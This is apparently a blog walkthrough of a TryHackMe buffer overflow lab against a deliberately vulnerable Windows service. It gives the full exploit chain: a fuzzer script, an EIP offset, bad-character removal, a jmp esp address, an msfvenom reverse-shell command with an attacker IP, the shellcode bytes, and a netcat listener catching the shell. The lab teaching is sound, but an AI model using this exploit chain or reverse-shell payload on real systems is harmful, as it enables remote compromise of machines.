---
title: "TryHackMe's Buffer Overflow Prep Room"
published: true
---

# TryHackMe's Buffer Overflow Prep Room

<https://tryhackme.com/r/room/bufferoverflowprep>

## Introduction

Buffer overflow attacks exploit a vulnerability where an application receives more data than it’s designed to handle, allowing malicious input to overwrite memory and potentially control the program’s flow. This type of exploit can allow an attacker to execute arbitrary code by manipulating the EIP (Extended Instruction Pointer), which determines the next instruction the CPU will execute.

In this article, I will walk through TryHackMe's Buffer Overflow Prep Room, which provides a hands-on approach to buffer overflow attacks, using tools like Immunity Debugger and Mona. Immunity Debugger is a popular Windows tool for debugging and analyzing applications, and Mona is a script that simplifies many exploit development tasks, such as finding patterns, checking for bad characters, and determining memory offsets. While the room focuses on practical exercises, I’ll provide additional insight into why each step is necessary and how it helps us reach our goal of controlling program execution.

## Fuzzing

Start the program in Immunity and test if it's working properly, then set the mona working folder. Detailed instruction are provided in the room description.

The first step towards buffer overflow is **fuzzing**, basically we want to find out how many bytes we need to send to the vulnerable application in order to overflow the buffer.  
We are being provided with a script to do so, let's check it out.

First it initializes the string to send to the target, it starts with 100 "A" chars, added to the command prefix.

```python
prefix = "OVERFLOW1 "

string = prefix + "A" * 100
```

Then, in a while loop establishes a connection with the target and sends the string. The loop will keep going until the application crashes, adding 100 more chars to the string at each iteration. When it finally crashes, it will generate an exception and print the amount of bytes that were necessary to make the application crash.

```bash
while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Let's run it and see what it does.

```bash
python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing crashed at 2000 bytes
```

As expected, after a while the application crashed.

## Controlling EIP

2000 bytes are enough to make the buffer overflow.  
That's a good start but now we want it to overflow enough to overwrite the content of the EIP register.  
Why do we care about the EIP register? It contains the address of the next instruction to be executed by the CPU, if we can write into it we can leverage it to execute our payload.  
We are going to create a non-repeating unique pattern and send it to the target. To be sure that we overwrite the EIP we will make the pattern bigger than the string that caused the crash, let's say 400 bytes bigger so 2400 bytes total.

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```

We are provided with a simple exploit script. It basically initialize a buffer variable concatenating a series of variables

```python
buffer = prefix + overflow + retn + padding + payload + postfix
```

We will use some of them in the next steps and their meaning will be clearer.  
Then it just sends the buffer to the target application.

```python
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
```

Set the value of the payload variable in the exploit script with the pattern we created earlier and run the exploit.  
Keep in mind that each time we crash the application, then we need to re-open the oscp.exe file and get it running again!  
Now we want to leverage the 'non-repeating unique' feature of the pattern to find out which part of the pattern was written in the EIP register and, more importantly, what is the byte offset we should use to write reliably in the EIP register.

In order to do so we can run the command `!mona findmsp -distance 2400` in the immunity debugger console.  
findmsp stands for 'find metasploit pattern' and the -distance parameter is the length of the pattern.

In the output there should be a line similar to this: `EIP contains normal pattern : 0x6f43396e (offset 1978)`.  
This tells us that the EIP register contains the "6f43396e" value and that it starts after 1978 of the pattern's bytes.

Make the following adjustments to the exploit script's variables:

```python
payload = ""
retn = "BBBB"
offset = 1978
```

Let's see what is accomplished by these changes.  
We remove the payload because we don't need it at this stage, we'll add it again later.  
The offset is set to the value we just found with the mona command, let's analyze this deeper:

```python
offset = 0
overflow = "A" * offset
```

The offset variable is used to create a overflow string of "A" chars, with the same length of the offset value, looking again at the buffer variable we can understand why.

```python
buffer = prefix + overflow + retn + padding + payload + postfix
```

The overflow variable is exactly 1978 bytes long, so it will overwrite all the memory until the start of the EIP register, at that point we can use the content of the retn variable to write an arbitrary value in the EIP register.
To test this assumption we write the value "BBBB" in the retn variable, if everything works as expected we should get the "BBBB" value contained exactly in the EIP register.

Run the exploit, now if you look at the debugger the EIP register should contain the value "42424242". 42 is the hexidecimal value for "B", so we managed to obtain control over the EIP register!

## Bad characters

Some characters may not be handled correctly by the application: they may be altered or removed entirely. This is a problem for us because it might break our payload, we need to find out which characters are "bad" so we can avoid using them when crafting the payload.

First create an array of all bytes from \x01 to \xFF running `!mona bytearray -b "\x00"` in Immunity. Notice that we already removed the \x00 char using the -b option: it's a notorious bad char for exploits because it's a string terminator and it prematurely ends the payload, breaking it.

These are the bytes generated:

```bash
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Set them as the value for the payload variable of the exploit script and run the exploit.
We then go to the debugger and take note of the value contained in the ESP register: `0197FA30`
Why do we need it?
Remember the buffer variable? `buffer = prefix + overflow + retn + padding + payload + postfix`
We overflowed the buffer with 1978 bytes of A chars (overflow variable), then wrote "BBBB" (retn variable) in EIP, the padding is currently empty, so that means that our payload lands in memory "right after" the EIP in the space **pointed by** ESP. In other words the memory location address immediately following EIP is contained in the ESP register.

Using mona we can compare the byte array we generated with the one contained in the memory of the application, to see which bytes were corrupted.
Run `!mona compare -f C:\mona\oscp\bytearray.bin -a 0197FA30` in Immunity

```asm
0197FA30                   | File              | Memory            | Note
0197FA30   ---------------------------------------------------------------------
0197FA30   0   0   6   6   | 01 02 03 04 05 06 | 01 02 03 04 05 06 | unmodified!
0197FA30   6   6   2   2   | 07 08             | 0a 0d             | corrupted
0197FA30   8   8   37  37  | 09 ... 2d         | 09 ... 2d         | unmodified!
0197FA30   45  45  2   2   | 2e 2f             | 0a 0d             | corrupted
0197FA30   47  47  112 112 | 30 ... 9f         | 30 ... 9f         | unmodified!
0197FA30   159 159 2   2   | a0 a1             | 0a 0d             | corrupted
0197FA30   161 161 94  94  | a2 ... ff         | a2 ... ff         | unmodified!
0197FA30   ---------------------------------------------------------------------
0197FA30
0197FA30   Possibly bad chars: 07 08 2e 2f a0 a1
0197FA30   Bytes omitted from input: 00
0197FA30
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.281000
```

We can see we have a few possible bad chars, let's generate a new bytearray without them.  
Run `!mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"`.  
Also, remove the bad chars from the exploit's payload variable.

Run again the exploit and repeat the comparison, now the EPS register contained the value 019EFA30. Be sure to always double check your values!

`!mona compare -f C:\mona\oscp\bytearray.bin -a 019EFA30`

Here's a part of the output

```bash
019EFA30   [+] Comparing with memory at location : 0x019efa30 (Stack)
019EFA30   !!! Hooray, normal shellcode unmodified !!!
019EFA30   Bytes omitted from input: 00 07 08 2e 2f a0 a1
```

The payload was now unmodified, it means we managed to remove all bad chars.

## Jump!

Now we have control over the EIP register and have isolated the bad chars, but what shall we write in the EIP register?
We know that our payload will start at the memory address contained in the ESP register, so we need to find a way to transfer execution to that address.
In assembly this can be done with a jmp instruction: we need a `jmp esp` instruction!

Let's go instruction fishing running `!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"`, this command finds all the `jmp esp` instructions present in the program that **don't** contain any of the bad chars.

We should find a few of them, the results should look like this:  
`  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)`

Notice that we don't alter the program in any way, we just reuse an already existing instruction that suits our purposes.  
Use the address 0x625011af (or any other address from the results) of the jmp instruction as the value for the retn variable in the exploit.
Be aware that we are working on little endian system, so we need to write it backwards: `retn = "\xaf\x11\x50\x62"`

## Generate the payload

With msfvenom we can generate a reverse shell payload that will allow us to take control of the target machine. Notice the -b option, used to generate a payload without the bad chars we found earlier.  
Change the LHOST with the IP of your attack machine.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.35.103 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c`

Use the result as the value of the exploit's payload variable, be careful with the python syntax.

```python
payload = ("\xda\xd9\xbd\xb1\x24\x73\xb7\xd9\x74\x24\xf4\x58\x33\xc9"
"\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x59\xd8\x91\x42\x65"
"\xc9\xd4\xad\x95\x0a\xb9\x24\x70\x3b\xf9\x53\xf1\x6c\xc9"
"\x10\x57\x81\xa2\x75\x43\x12\xc6\x51\x64\x93\x6d\x84\x4b"
"\x24\xdd\xf4\xca\xa6\x1c\x29\x2c\x96\xee\x3c\x2d\xdf\x13"
"\xcc\x7f\x88\x58\x63\x6f\xbd\x15\xb8\x04\x8d\xb8\xb8\xf9"
"\x46\xba\xe9\xac\xdd\xe5\x29\x4f\x31\x9e\x63\x57\x56\x9b"
"\x3a\xec\xac\x57\xbd\x24\xfd\x98\x12\x09\x31\x6b\x6a\x4e"
"\xf6\x94\x19\xa6\x04\x28\x1a\x7d\x76\xf6\xaf\x65\xd0\x7d"
"\x17\x41\xe0\x52\xce\x02\xee\x1f\x84\x4c\xf3\x9e\x49\xe7"
"\x0f\x2a\x6c\x27\x86\x68\x4b\xe3\xc2\x2b\xf2\xb2\xae\x9a"
"\x0b\xa4\x10\x42\xae\xaf\xbd\x97\xc3\xf2\xa9\x54\xee\x0c"
"\x2a\xf3\x79\x7f\x18\x5c\xd2\x17\x10\x15\xfc\xe0\x57\x0c"
"\xb8\x7e\xa6\xaf\xb9\x57\x6d\xfb\xe9\xcf\x44\x84\x61\x0f"
"\x68\x51\x25\x5f\xc6\x0a\x86\x0f\xa6\xfa\x6e\x45\x29\x24"
"\x8e\x66\xe3\x4d\x25\x9d\x64\x78\xb0\xbe\x13\x14\xc6\xc0"
"\xca\xb8\x4f\x26\x86\x50\x06\xf1\x3f\xc8\x03\x89\xde\x15"
"\x9e\xf4\xe1\x9e\x2d\x09\xaf\x56\x5b\x19\x58\x97\x16\x43"
"\xcf\xa8\x8c\xeb\x93\x3b\x4b\xeb\xda\x27\xc4\xbc\x8b\x96"
"\x1d\x28\x26\x80\xb7\x4e\xbb\x54\xff\xca\x60\xa5\xfe\xd3"
"\xe5\x91\x24\xc3\x33\x19\x61\xb7\xeb\x4c\x3f\x61\x4a\x27"
"\xf1\xdb\x04\x94\x5b\x8b\xd1\xd6\x5b\xcd\xdd\x32\x2a\x31"
"\x6f\xeb\x6b\x4e\x40\x7b\x7c\x37\xbc\x1b\x83\xe2\x04\x3b"
"\x66\x26\x71\xd4\x3f\xa3\x38\xb9\xbf\x1e\x7e\xc4\x43\xaa"
"\xff\x33\x5b\xdf\xfa\x78\xdb\x0c\x77\x10\x8e\x32\x24\x11"
"\x9b")
```

## Make the payload comfortable

Since an encoder was likely used to generate the payload, it will need some space in memory to unpack itself. You can get it by setting the padding variable to a string of 16 or more "No Operation" instructions (\x90).  
Set the variable `padding = "\x90" * 16` to the exploit.

## Exploitation

Start a listener on the attack machine to catch the reverse shell and run the exploit.

```bash
rlwrap nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.128.219 49216 received!
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>whoami
whoami
oscp-bof-prep\admin
```

As you can see from the output our payload executed correctly and we managed to obtain shell access to the target, how fun.

Now it's your turn to get your hands dirty with the other tasks!

That's all for now, see you on the next one. Meanwhile, keep hacking!
